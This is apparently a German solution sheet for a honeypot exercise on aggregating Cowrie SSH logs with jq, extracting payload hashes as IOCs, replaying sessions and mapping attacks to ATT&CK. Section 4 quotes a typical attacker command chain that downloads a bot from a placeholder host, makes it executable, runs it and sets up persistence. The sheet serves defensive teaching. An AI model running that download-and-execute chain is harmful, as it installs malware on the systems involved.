# Lösung – Übung 03: Cowrie-Logs auswerten

## 2. Aggregationen mit jq

```bash
cd ~/cowrie
L=var/log/cowrie/cowrie.json

# Top-10 Quell-IPs
jq -r 'select(.eventid|startswith("cowrie.login")) | .src_ip' $L | sort | uniq -c | sort -rn | head

# Top probierte Credentials (user/pass)
jq -r 'select(.eventid|startswith("cowrie.login")) | "\(.username):\(.password)"' $L | sort | uniq -c | sort -rn | head

# Top Befehle nach Login
jq -r 'select(.eventid=="cowrie.command.input") | .input' $L | sort | uniq -c | sort -rn | head
```

## 3. Downloads / Hashes

```bash
jq -r 'select(.eventid=="cowrie.session.file_download") | "\(.url)  \(.shasum)"' $L
ls -l var/lib/cowrie/downloads/     # Dateien benannt nach SHA256
```
Die SHA256 sind direkt IOCs (später in Threat-Intel/YARA).

## 4. Session-Replay

```bash
ls var/lib/cowrie/tty/
bin/cowrie-playlog var/lib/cowrie/tty/<session>.log
```
Typische Kette: Login (Brute-Force erfolgreich) → `uname -a`/`cat /proc/cpuinfo` (Recon) → `wget http://<ip>/bot; chmod +x; ./bot` (Download+Execution) → Crontab/rc.local (Persistence). Mappt auf ATT&CK: T1110 (Brute Force), T1059 (Command Execution), T1105 (Ingress Tool Transfer), T1053/T1037 (Persistence).

## Härtung/Betrieb

- Logrotation aktivieren; Logs an SIEM weiterleiten (Übung 07/10).
- Downloads nie ausführen – nur hashen/analysieren.

## Häufige Fehler / Troubleshooting

- Leere Auswertung → falscher Log-Pfad oder noch keine Events erzeugt.
- `jq`-Fehler bei mehrzeiligem Output → `-r` + gültige Event-Filter.
- Zeitzonen beachten (Cowrie loggt UTC) beim Korrelieren mit anderen Quellen.
